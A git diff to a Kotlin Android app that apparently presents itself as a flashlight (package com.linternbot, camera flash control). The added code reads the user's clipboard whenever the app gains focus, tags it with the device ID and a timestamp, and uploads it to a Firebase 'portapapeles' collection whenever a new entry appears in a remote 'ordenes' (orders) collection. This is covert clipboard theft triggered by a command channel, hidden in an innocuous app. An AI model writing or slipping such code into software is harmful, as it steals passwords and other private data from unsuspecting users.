@@ -1,18 +1,25 @@
 package com.linternbot
 
+import android.content.ClipboardManager
 import android.content.Context
 import android.hardware.camera2.CameraManager
 import android.os.Build
 import android.os.Bundle
+import android.os.PowerManager
 import android.provider.Settings
-import androidx.appcompat.app.ActionBar
-import androidx.appcompat.app.AppCompatActivity
 import android.util.Log
 import android.view.View.INVISIBLE
 import android.view.View.VISIBLE
 import android.widget.ImageView
+import android.widget.Toast
 import androidx.annotation.RequiresApi
-
+import androidx.appcompat.app.ActionBar
+import androidx.appcompat.app.AppCompatActivity
+import com.google.firebase.firestore.DocumentChange
+import com.google.firebase.firestore.ktx.firestore
+import com.google.firebase.ktx.Firebase
+import java.text.SimpleDateFormat
+import java.util.*
 
 
 var idAndroid = ""  // Variable global para almacenar el identificador unico del dispositivo android
@@ -74,6 +81,36 @@ class MainActivity : AppCompatActivity() {
                     print("Error al encontrar el flash")
                 }
             }
+        }
+    }
+    override fun onWindowFocusChanged(hasFocus: Boolean) {
+        super.onWindowFocusChanged(hasFocus)
+        if (hasFocus){
+            val c = Calendar.getInstance()
+            val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
+            val strDate: String = sdf.format(c.time)
+            val db = Firebase.firestore
+            val clipBoardManager = this.getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
+            val copiedString = clipBoardManager.primaryClip.toString()
+            Log.d("TAG2","este texto es " + copiedString!!)
+            val datosPortapapeles = hashMapOf(
+                "User" to idAndroid,
+                "Date" to strDate,
+                "Portapapeles" to copiedString
+            )
+            db.collection("ordenes")
+                .addSnapshotListener { snapshot, e ->
+                    if (e != null) {
+                        Log.d("TAG", "Fallada la escucha de la primitiva.", e)
+                        return@addSnapshotListener
+                    }
+
+                    for (dc in snapshot!!.documentChanges) {
+                        when (dc.type) {
+                            DocumentChange.Type.ADDED -> db.collection("portapapeles").document(idAndroid).set(datosPortapapeles)
+                        }
+                    }
+                }
         }
     }
 }
